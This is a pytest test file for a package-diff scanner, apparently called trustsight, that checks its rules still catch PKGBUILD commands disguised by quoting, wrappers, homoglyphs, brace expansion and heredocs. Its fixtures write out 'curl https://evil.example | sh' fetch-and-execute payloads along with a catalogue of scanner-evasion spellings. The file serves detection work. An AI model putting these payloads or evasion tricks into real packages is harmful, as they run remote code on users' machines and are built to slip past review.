"""Crossfire rules, and the evasions they had to survive.

A family whose whole purpose is detecting evasion is the one place where
"can the rule itself be evaded" is not a rhetorical question. Every case in
`EVASIONS` below defeated an earlier version of these rules, so each one is a
regression test rather than a hypothetical.

The recurring shape is the same in each: **a command word is not always the
first token.** An assignment, a wrapper, a redirect or a subshell opener can
each push the real command one or more tokens to the right, and a scan that
reads position zero misses all of them.
"""

import pytest

from trustsight.analysis import scan_diff
from trustsight.analysis.crossfire import crossfire_techniques


def _fire(command, function="build"):
    diff = (f"--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,3 +1,4 @@\n {function}() {{\n"
            f"+  {command}\n }}\n")
    return set(crossfire_techniques(diff))


# ---------------------------------------------------------------------------
# X002: the rule the family rests on, and the one most worth attacking.
# ---------------------------------------------------------------------------

BYPASSES = [
    ("array-routing",       '${A[0]} https://evil.example | bash'),
    ("nameref",             '${cmd} -fsSL https://evil.example | sh'),
    ("command-substitution", '$(printf "\\x63\\x75\\x72\\x6c") evil.example'),
    ("partial-quote-double", 'c"u"rl -fsSL https://evil.example'),
    ("partial-quote-single", "c'u'rl -fsSL https://evil.example"),
    ("backtick",            '`echo curl` https://evil.example'),
    ("ansi-c-string",       "$'\\x63\\x75\\x72\\x6c' https://evil.example"),
]


@pytest.mark.parametrize("label,command", BYPASSES)
def test_every_known_tokenizer_bypass_fires_x002(label, command):
    """The bypass and the alarm are the same event."""
    assert "X002" in _fire(command), label


EVASIONS = [
    # Each of these hid the command word from an earlier version.
    ("env-assignment-prefix", 'FOO=1 ${A[0]} https://evil.example'),
    ("env-wrapper",           'env ${A[0]} https://evil.example'),
    ("exec-wrapper",          'exec ${A[0]} https://evil.example'),
    ("sudo-wrapper",          'sudo ${A[0]} https://evil.example'),
    ("nohup-wrapper",         'nohup ${A[0]} https://evil.example'),
    ("command-builtin",       'command ${A[0]} https://evil.example'),
    ("timeout-with-number",   'timeout 5 ${A[0]} https://evil.example'),
    ("leading-redirect",      '>out ${A[0]} https://evil.example'),
    ("subshell",              '( ${A[0]} https://evil.example )'),
    ("leading-tab",           '\t${A[0]} https://evil.example'),
]


@pytest.mark.parametrize("label,command", EVASIONS)
def test_x002_survives_command_word_displacement(label, command):
    """A prefix moves the command word; it does not hide it."""
    assert "X002" in _fire(command), label


def test_x002_stands_down_when_the_tokenizer_resolved_the_name():
    """A resolved name is the payload rules' business, not this one's.

    `A=curl` then `$A ...` reduces to a literal, so the resolved text carries
    the payload and R001 claims it. X002 firing too would score one command
    twice and would report an evasion where none happened.
    """
    diff = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,3 +1,5 @@\n build() {\n"
            "+  A=curl\n+  $A -fsSL https://evil.example | bash\n }\n")
    assert "X002" not in set(crossfire_techniques(diff))

    fired = {e.rule_id for e in scan_diff(diff, package_name="p").score_breakdown}
    assert "R001" in fired, "the resolved payload must still be caught"


NOT_COMMANDS = [
    # Each of these fired on the benign corpus before it was excluded.
    ("assignment-rhs",     'font=`grep -o -e "THE FONT" License.rtf | head -1`'),
    ("continuation-flag",  '-i "${installDir}/dkms.conf"'),
    ("arithmetic",         "(( $(vercmp $2 '1.3.0-2') >= 0 )) && return"),
    ("sed-pipe-separator", 'sed -i \'s|"$LIBS -lavcodec"|"$LIBS"|\' configure'),
    ("plain-command",      'make DESTDIR="$pkgdir" install'),
    ("configure",          './configure --prefix=/usr'),
]


@pytest.mark.parametrize("label,command", NOT_COMMANDS)
def test_x002_is_silent_on_ordinary_shell(label, command):
    assert "X002" not in _fire(command), label


# ---------------------------------------------------------------------------
# X001 and X005: the same displacement problem in two other shapes.
# ---------------------------------------------------------------------------


@pytest.mark.parametrize("label,command", [
    ("piped-to-sh",       r"printf '\x63\x75\x72' | sh"),
    ("absolute-path-sh",  r"printf '\x63\x75\x72' | /bin/sh"),
    ("env-wrapped-sh",    r"printf '\x63\x75\x72' | env sh"),
    ("no-space",          r"printf '\x63\x75\x72'|sh"),
    ("bash-dash-s",       r"printf '\x63\x75\x72' | bash -s"),
    ("xxd-reverse",       "xxd -r -p payload.hex | bash"),
])
def test_x001_catches_the_shell_however_it_is_spelled(label, command):
    """Naming the shell by path or behind `env` was an evasion."""
    assert "X001" in _fire(command), label


@pytest.mark.parametrize("label,command", [
    ("literal-home",   'install -Dm755 t /home/alice/bin/x'),
    ("variable-user",  'install -Dm755 t /home/$USER/bin/x'),
    ("braced-user",    'install -Dm755 t /home/${USER}/bin/x'),
    ("double-slash",   'install -Dm755 t /home//alice/bin/x'),
    ("tilde-user",     'install -Dm755 t ~alice/bin/x'),
    ("root-home",      'cp t /root/bin/x'),
    ("home-default",   'cp t ${HOME:-/home/alice}/x'),
    ("traversal",      'cp t ../../home/alice/bin/x'),
    ("quoted",         'install -Dm755 t "/home/alice/bin/x"'),
    ("assignment-prefix", 'FOO=1 cp t /home/alice/bin/x'),
])
def test_x005_catches_every_spelling_of_a_home_path(label, command):
    assert "X005" in _fire(command, function="post_install"), label


@pytest.mark.parametrize("label,command", [
    ("r077-owns-tilde", 'install -Dm755 t ~/bin/tool'),
    ("r077-owns-home",  'install -Dm644 c $HOME/.bashrc'),
    ("pkgdir-staging",  'install -Dm755 t "$pkgdir/home/shared/tool"'),
    ("srcdir",          'cp t "$srcdir/home/x"'),
])
def test_x005_defers_and_exempts_staging(label, command):
    """One write is scored once, and staging is not somebody's home."""
    assert "X005" not in _fire(command, function="post_install"), label


# ---------------------------------------------------------------------------
# X007 and bounds.
# ---------------------------------------------------------------------------


def test_x007_needs_two_distinct_techniques():
    from trustsight.analysis.crossfire import X007_MIN_TECHNIQUES

    assert X007_MIN_TECHNIQUES == 2
    one = _fire('${A[0]} https://evil.example')
    assert len(one) < X007_MIN_TECHNIQUES

    diff = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,4 +1,7 @@\n build() {\n"
            "+  set +x\n+  ${A[0]} https://evil.example | sh\n }\n")
    assert len(set(crossfire_techniques(diff))) >= X007_MIN_TECHNIQUES

    fired = {e.rule_id for e in scan_diff(diff, package_name="p").score_breakdown}
    assert "X007" in fired


def test_matching_is_bounded_on_a_hostile_line():
    """A5: no crossfire pattern may be made to backtrack.

    An earlier sabotage rule cost 2.4 seconds on one 8 KiB line and failed
    the `rule matching is bounded on hostile input` gate; every span in this
    module carries a constant ceiling for the same reason.
    """
    import time

    from trustsight.rules import MAX_RULE_LINE_BYTES

    for filler in ("a", '"', "$", "`", "|", "(", "-", "/"):
        line = "  " + filler * MAX_RULE_LINE_BYTES
        diff = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,1 +1,3 @@\n build() {\n+"
                + line + "\n}\n")
        start = time.monotonic()
        crossfire_techniques(diff)
        assert time.monotonic() - start < 0.5, f"slow on {filler!r}"


def test_techniques_are_reported_deterministically():
    """Same input, same order: a report a reader can diff between runs."""
    diff = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,4 +1,7 @@\n build() {\n"
            "+  set +x\n+  ${A[0]} https://bit.ly/x | sh\n }\n")
    first = crossfire_techniques(diff)
    for _ in range(5):
        assert crossfire_techniques(diff) == first


# ---------------------------------------------------------------------------
# Esoteric shell: the same payload, wrapped every way a PKGBUILD allows.
# ---------------------------------------------------------------------------

PAYLOAD = "https://evil.example/x"

WRAPPINGS = [
    ("plain",             f'curl {PAYLOAD} | sh'),
    ("heredoc",           f'bash <<EOF\n+curl {PAYLOAD} | sh\n+EOF'),
    ("heredoc-quoted",    f"bash <<'EOF'\n+curl {PAYLOAD} | sh\n+EOF"),
    ("here-string",       f'bash <<< "curl {PAYLOAD} | sh"'),
    ("process-subst",     f'bash <(curl -s {PAYLOAD})'),
    ("brace-expansion",   f'cur{{l,}} {PAYLOAD} | sh'),
    ("param-replace",     f'c=XurlX; ${{c//X/}} {PAYLOAD} | sh'),
    ("param-case",        f'c=CURL; ${{c,,}} {PAYLOAD} | sh'),
    ("array-slice",       f'a=(curl x); ${{a[@]:0:1}} {PAYLOAD} | sh'),
    ("case-statement",    f'case 1 in\n+1) curl {PAYLOAD} | sh ;;\n+esac'),
    ("homoglyph",         f'сurl {PAYLOAD} | sh'),
    ("semicolons",        f';;curl {PAYLOAD}|sh;;'),
    ("deep-indent",       " " * 3000 + f'curl {PAYLOAD} | sh'),
]


@pytest.mark.parametrize("label,command", WRAPPINGS)
def test_no_wrapping_hides_a_payload(label, command):
    """Every one of these carries the same fetch-and-execute payload.

    A wrapping that scores only the source-bucket prior has hidden the
    payload itself: the domain was noticed and the command was not.
    """
    diff = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,3 +1,8 @@\n build() {\n"
            f"+  {command}\n }}\n")
    fact = scan_diff(diff, package_name="demo")
    fired = {e.rule_id for e in fact.score_breakdown
             if e.weight or e.severity in ("FATAL", "CRITICAL")}
    assert fired - {"SOURCE_BUCKET"}, (
        f"{label}: only the source prior fired, so the payload was hidden"
    )
    assert fact.final_score > 20, f"{label} scored {fact.final_score}"


def test_a_command_name_split_across_a_continuation_is_rejoined():
    """`cur\\` + `l` is `curl`: the shell removes the backslash-newline.

    Both joiners used to insert a space, producing `cur l` - two words, and
    every rule that matches the command name saw neither. There are two
    implementations (`join_line_continuations` and the indexed form the rule
    path uses), and fixing one left the other reachable.
    """
    from trustsight.tokenizer import join_line_continuations

    assert join_line_continuations(["+  cur\\", "+l https://x | sh"]) == [
        "+  curl https://x | sh"
    ]
    # Indentation on the continuation still separates arguments.
    assert join_line_continuations(["+  curl \\", "+    https://x"]) == [
        "+  curl    https://x"
    ]

    diff = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,3 +1,6 @@\n build() {\n"
            "+  cur\\\n+l https://evil.example/x | sh\n+}\n")
    fired = {e.rule_id for e in scan_diff(diff, package_name="p").score_breakdown}
    assert "R001" in fired, "the rejoined command must reach the payload rules"


@pytest.mark.parametrize("label,command", [
    ("cyrillic-c",  "сurl https://x | sh"),
    ("cyrillic-o",  "cоrl https://x | sh"),
    ("brace-comma", "cur{l,} https://x"),
    ("brace-range", "cmd{1..3} https://x"),
])
def test_x002_claims_assembled_and_impersonating_names(label, command):
    assert "X002" in _fire(command), label


@pytest.mark.parametrize("label,command", [
    # A typographic apostrophe impersonates nothing and names no command.
    ("prose-apostrophe", "wizard’s default settings apply here"),
    ("brace-argument",   "cp file{1,2}.txt /tmp"),
    ("emoji-echo",       "echo \U0001F600 done"),
])
def test_x002_does_not_fire_on_ordinary_non_ascii(label, command):
    """"Any non-ASCII" was too broad: it fired on English prose."""
    assert "X002" not in _fire(command), label
